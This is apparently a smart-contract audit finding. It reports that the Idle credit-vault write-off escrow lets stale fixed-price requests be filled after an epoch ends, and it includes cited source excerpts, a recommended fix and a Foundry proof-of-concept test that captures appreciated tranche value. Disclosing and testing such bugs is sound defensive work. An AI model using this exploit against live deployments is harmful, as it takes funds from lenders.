### Title
Stale write-off requests remain executable after the epoch ends, allowing an attacker to buy appreciated tranche tokens at an obsolete fixed price - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` accepts a lender’s tranche tokens and fixed underlying quote only while an epoch is running, but `fullfillWriteOffRequest` does not verify that the epoch is still running, does not bind the request to its creation epoch, and has no expiry. Consequently, a stale request survives epoch settlement and can be fulfilled immediately after tranche NAV rises, before the lender can cancel. [1](#0-0) [2](#0-1) 

### Finding Description
The bug class is a stale authorization remaining usable after a security-relevant state change. A write-off request is effectively a signed/fixed-price order secured by escrowed tranche tokens. The lifecycle explicitly permits creating that order only during a running epoch, but fulfillment lacks the corresponding `isEpochRunning()` check. [3](#0-2) [4](#0-3) 

Once stored, `userRequests[_user]` remains valid until the lender explicitly deletes it or someone fulfills it. `fullfillWriteOffRequest` transfers the entire escrowed `_tranches` amount to the fulfiller for the old `_underlyings` quote and clears the request in the same transaction. [5](#0-4) [6](#0-5) 

A successful `stopEpoch` can increase tranche prices/NAV through epoch accounting. An attacker can monitor a pending request, wait for `stopEpoch` to raise the value represented by the escrowed tranches, then atomically fulfill the obsolete quote. The lender receives only the stale fixed amount while losing tranche tokens whose current withdrawal value is higher. [7](#0-6) [8](#0-7) 

### Impact Explanation
This permits direct value extraction from a lender. The attacker spends the old requested amount and receives tranche tokens redeemable against the credit vault at the post-yield value. The loss is approximately:

```solidity
trancheAmount * tranchePriceAfterEpoch / 1e18 - requestedUnderlying
```

less any withdrawal fees. For example, if a lender escrows `10_000e18` AA tranche tokens for `10_000` USDC and epoch settlement raises the tranche value to `11_000` USDC, the attacker can capture roughly `1_000` USDC of NAV by fulfilling before cancellation. The stale-order invariant is broken because an order authorized only during the running epoch remains enforceable after that epoch has ended. [1](#0-0) [2](#0-1) 

### Likelihood Explanation
Likelihood depends on a lender leaving a write-off request open while epoch settlement increases tranche value. This is plausible because write-off orders are designed to remain pending while lenders wait for a borrower or third-party buyer, and the protocol intentionally allows any wallet to fulfill them. The attacker can execute immediately after `stopEpoch`, leaving no practical cancellation window. [9](#0-8) [10](#0-9) 

### Recommendation
Bind each write-off request to the epoch state in which it was authorized. At minimum, `fullfillWriteOffRequest` should require `IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()`. A stronger fix is to record `epochNumber` or a creation timestamp in `WriteOffRequest`, then reject fulfillment after the epoch changes or after a short lender-defined expiry. [11](#0-10) [12](#0-11) 

### Proof of Concept
Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`. The existing setup forks mainnet, deploys the escrow, disables Keyring, and approves the escrow for `LP`’s AA tranches. [13](#0-12) 

```solidity
function testStaleWriteOffRequestFulfilledAfterEpochEnd() external {
  uint256 trancheAmount = 10_000e18;
  uint256 requestedUnderlying = 10_000e6;
  address buyer = makeAddr("buyer");

  // LP posts a fixed-price order while the epoch is running.
  assertTrue(cdoEpoch.isEpochRunning(), "epoch must be running");
  vm.prank(LP);
  escrow.createWriteOffRequest(trancheAmount, requestedUnderlying);

  // Honest epoch settlement accrues value into the AA tranche.
  _stopCurrentEpochWithApr(10e18);
  assertFalse(cdoEpoch.isEpochRunning(), "epoch must have ended");
  assertGt(
    cdoEpoch.virtualPrice(address(tranche)),
    requestedUnderlying * ONE_TRANCHE / trancheAmount,
    "post-stop tranche value must exceed stale quote"
  );

  // The stale request remains fulfillable before LP can cancel it.
  deal(address(underlying), buyer, requestedUnderlying);
  vm.startPrank(buyer);
  underlying.approve(address(escrow), requestedUnderlying);
  escrow.fullfillWriteOffRequest(LP, trancheAmount, requestedUnderlying);
  vm.stopPrank();

  assertEq(tranche.balanceOf(buyer), trancheAmount, "buyer did not receive tranches");

  // Demonstrate that the purchased tranches are worth more than the paid quote.
  uint256 withdrawable = cdoEpoch.maxWithdrawable(buyer, address(tranche));
  assertGt(withdrawable, requestedUnderlying, "stale quote should be below current NAV");
}
```

The critical assertion is that `fullfillWriteOffRequest` succeeds after `isEpochRunning()` is false. Requiring the running-epoch predicate in fulfillment would make this transaction revert. [3](#0-2) [2](#0-1)

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L24-29)
```text
  struct WriteOffRequest {
    /// @notice tranche tokens provided by the lender
    uint256 tranches;
    /// @notice underlyings requested by the lender
    uint256 underlyings;
  }
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L104-115)
```text
  /// @notice delete the write-off request and transfer tranche tokens back to the user
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L118-151)
```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** contracts/IdleCDOEpochVariant.sol (L322-343)
```text
  function stopEpoch(uint256 _newApr, uint256 _interest) public {
    _stopEpoch(_newApr, _interest, 0);
  }

  /// @notice Internal stop-epoch implementation with optional proportional pending-receipt loss.
  /// @param _newApr New apr to set for the next epoch
  /// @param _interest Interest gained in the epoch
  /// @param _lossAmount Loss amount to split between active LPs and pending receipts
  function _stopEpoch(uint256 _newApr, uint256 _interest, uint256 _lossAmount) private {
    _checkOnlyOwnerOrManager();
    bool _isRequestingAllFunds = _interest == 1;
    _checkProgrammableBorrowerMode();

    IdleCreditVault _strategy = IdleCreditVault(strategy);
    uint256 _pendingWithdrawFees = pendingWithdrawFees;

    _checkNotAllowed(
      // Check that epoch is running
      !isEpochRunning || 
      // Check that end date is passed
      block.timestamp < epochEndDate || 
      // Check that there are no pending instant withdraws, ie `getInstantWithdrawFunds` was called
```

**File:** contracts/IdleCDOEpochVariant.sol (L408-466)
```text
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
      // When requesting all funds (_interest == 1) the CDO pulls cash directly, no fronting.
      if (_mintInterest && isProgrammableBorrower) {
        IProgrammableBorrower(_borrower()).settleBorrowerInterest();
      }
      // Split pending withdraw fees before update accounting
      // NOTE: Fees are sent with 2 different transfer calls, here and after updateAccounting, to avoid complicated calculations
      if (!_mintInterest) {
        _transferFeeUnderlyings(_pendingWithdrawFees);
      }

      if (_isRequestingAllFunds) {
        // we already have strategyTokens equal to _totBorrowed in this contract
        // so we transfer _totBorrowed to the strategy to avoid double counting for getContractValue
        _transferUnderlyings(address(_strategy), _totBorrowed);
      }

      if (_mintInterest) {
        // if interest is not transferred we mint strategy tokens equal to the full epoch interest
        if (_grossInterest != 0) _strategy.mintStrategyTokens(_grossInterest);
        // and increase unclaimedFees by pending withdraw fees before _updateAccounting
        unclaimedFees += _pendingWithdrawFees;
      }

      // update tranche prices and unclaimed fees
      _updateAccounting();

      // transfer fees
      uint256 _fees = unclaimedFees;
      if (_mintInterest) {
        // If interest is minted then we mint new shares for fee receivers instead of transferring underlyings
        if (_fees != 0) {
          uint256 feeReceiverAmount = _feeReceiverAmount(_fees);
          if (feeReceiverAmount != 0) {
            _mintSharesAtCurrPrice(feeReceiverAmount, feeReceiver, AATranche);
          }
          _mintSharesAtCurrPrice(_fees - feeReceiverAmount, owner(), AATranche);
          _updateSplitRatio(_getAARatio(true));
        }
      } else {
        // Cash-funded fees can only use gross interest not already owed to pending withdrawals.
        uint256 _availableForFees = _grossInterest > _pendingWithdrawFees ? _grossInterest - _pendingWithdrawFees : 0;
        if (_fees > _availableForFees) {
          _fees = _availableForFees;
        }
        _transferFeeUnderlyings(_fees);
      }
      // Any fee that cannot be paid in cash remains accrued and continues reducing NAV.
      unclaimedFees -= _fees;

      uint256 _totalFees = _fees + (_mintInterest ? 0 : _pendingWithdrawFees);
      // save net gain (this does not include interest gained for pending withdrawals)
      uint256 netInterest = _grossInterest > _totalFees ? _grossInterest - _totalFees : 0;
      lastEpochInterest = netInterest;
      // mint strategyTokens equal to interest and send underlying to strategy to avoid double counting for NAV
      _strategy.deposit(_mintInterest ? 0 : netInterest);
```

**File:** test/foundry/IdleCreditVaultWriteOffEscrow.t.sol (L32-63)
```text
  function setUp() public {
    vm.createSelectFork('mainnet', 23032567);

    // we deploy a new IdleCDOEpochVariant and IdleCreditVault contract used only to get the bytecode 
    // and etch at the same address of the original one so to enable console.log in the IdleCDOEpochVariant 
    // and new features not yet deployed on mainnet
    IdleCDOEpochVariant dummy = new IdleCDOEpochVariant();
    IdleCreditVault dummyStrategy = new IdleCreditVault();
    vm.etch(address(cdoEpoch), address(dummy).code);
    vm.etch(cdoEpoch.strategy(), address(dummyStrategy).code);

    escrow = new IdleCreditVaultWriteOffEscrow();
    // allow initialization of the escrow contract
    vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
    escrow.initialize(address(cdoEpoch), TL_MULTISIG, true);

    underlying = IERC20Detailed(cdoEpoch.token());
    strategy = IdleCreditVault(cdoEpoch.strategy());
    manager = strategy.manager();
    borrower = strategy.borrower();
    tranche = IERC20Detailed(cdoEpoch.AATranche());

    // approve escrow contract to spend tranches tokens of address(this)
    tranche.approve(address(escrow), type(uint256).max);

    // allow everyone to deposit
    vm.prank(cdoEpoch.owner());
    cdoEpoch.setKeyringParams(address(0), 1);

    vm.prank(LP);
    tranche.approve(address(escrow), type(uint256).max);
  }
```
